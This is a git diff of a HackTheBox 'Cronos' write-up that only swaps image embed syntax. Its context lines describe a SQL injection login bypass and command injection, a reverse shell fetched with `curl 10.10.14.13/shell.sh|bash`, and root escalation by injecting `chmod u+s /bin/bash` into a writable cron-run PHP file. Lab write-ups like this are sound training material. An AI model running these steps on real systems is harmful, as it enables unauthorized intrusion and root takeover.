@@ -43,33 +43,33 @@ cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 
 
 Port 80 reveals the default Apache2 page:
 
-<figure><img src="../../../.gitbook/assets/image (698).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(698).png>)
 
 After adding `cronos.htb` to the `/etc/hosts` file, this page changes:
 
-<figure><img src="../../../.gitbook/assets/image (644).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(644).png>)
 
 Checking the page source reveals this is a Laravel application.
 
-<figure><img src="../../../.gitbook/assets/image (550).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(550).png>)
 
 ### SQLI Login Bypass -> RCE
 
 Earlier, we also found an `admin.cronos.htb` through DNS. When visited, it just shows a login page:
 
-<figure><img src="../../../.gitbook/assets/image (889).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(889).png>)
 
 This looks vulnerable to some kind of injection. I ran `sqlmap` on the login request and found that it might be vulnerable to time-based SQL injection. That also means we can bypass this login page by doing basic injection. When we login, we see that it is a really basic application:
 
-<figure><img src="../../../.gitbook/assets/image (3089).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3089).png>)
 
 This is obviously vulnerable to command injection, which we can find quite easily:
 
-<figure><img src="../../../.gitbook/assets/image (1961).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1961).png>)
 
 We can then get a reverse shell using `curl 10.10.14.13/shell.sh|bash`.
 
-<figure><img src="../../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(331).png>)
 
 ## Privilege Escalation
 
@@ -106,7 +106,7 @@ We can easily grab the user flag from this.
 
 Running LinPEAS reveals this:
 
-<figure><img src="../../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(663).png>)
 
 The `root` user was running a PHP file called `artisan` that we had write access to. So we just need to append some commands to the top. We can edit it to include this line:
 
@@ -116,4 +116,4 @@ exec("chmod u+s /bin/bash");
 
 Wait for a little bit, and the script should execute. We can then easily get a `root` shell.
 
-<figure><img src="../../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(120).png>)
